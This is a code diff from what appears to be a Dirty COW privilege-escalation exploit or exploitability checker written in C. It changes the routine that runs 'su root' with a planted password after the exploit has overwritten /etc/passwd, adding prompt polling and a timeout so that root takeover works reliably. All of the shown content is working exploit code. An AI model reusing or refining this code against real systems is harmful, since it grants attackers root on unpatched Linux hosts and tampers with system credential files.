@@ -75,6 +75,7 @@
 #include <sys/stat.h>
 #include <sys/wait.h>
 #include <sys/types.h>
+#include <poll.h>
 
 /* Stable-branch backport thresholds for Dirty COW. */
 static const struct kernel_patched_from dirty_cow_patched_branches[] = {
@@ -159,17 +160,29 @@ static void dc_su_root_run(const char *cmd)
         execlp("su", "su", "root", "-c", cmd, (char *)NULL);
         _exit(127);
     }
-    usleep(400 * 1000);
-    char drain[256];
-    ssize_t n = read(mfd, drain, sizeof drain);
-    (void)n;
-    if (write(mfd, DC_ROOT_PW "\n", sizeof(DC_ROOT_PW)) < 0) { /* ignore */ }
-    for (;;) {
-        ssize_t m = read(mfd, drain, sizeof drain);
-        if (m <= 0) break;
+    /* Poll for the password prompt, send the password, then drain — with a
+     * hard 20s cap so a misbehaving su can never hang (which would block the
+     * revert and leave /etc/passwd poisoned). Fixed a real hang seen on
+     * xenial where the fixed-delay write raced su's prompt setup. */
+    struct pollfd pfd = { .fd = mfd, .events = POLLIN };
+    const char *pw = DC_ROOT_PW "\n";
+    bool sent = false; char acc[1024]; size_t accl = 0; int waited = 0;
+    while (waited < 20000) {
+        int pr = poll(&pfd, 1, 200);
+        if (pr > 0 && (pfd.revents & POLLIN)) {
+            char b[256]; ssize_t m = read(mfd, b, sizeof b);
+            if (m <= 0) break;                       /* pty closed → su exited */
+            if (!sent) {
+                if (accl + (size_t)m < sizeof acc) { memcpy(acc + accl, b, m); accl += (size_t)m; acc[accl] = 0; }
+                if (strcasestr(acc, "assword")) { (void)!write(mfd, pw, strlen(pw)); sent = true; }
+            }
+        } else {
+            waited += 200;
+            int st; if (waitpid(pid, &st, WNOHANG) == pid) { pid = -1; break; }
+            if (!sent && waited >= 1000) { (void)!write(mfd, pw, strlen(pw)); sent = true; }
+        }
     }
-    int st;
-    waitpid(pid, &st, 0);
+    if (pid > 0) { kill(pid, SIGKILL); waitpid(pid, NULL, 0); }
     close(mfd);
 }
 
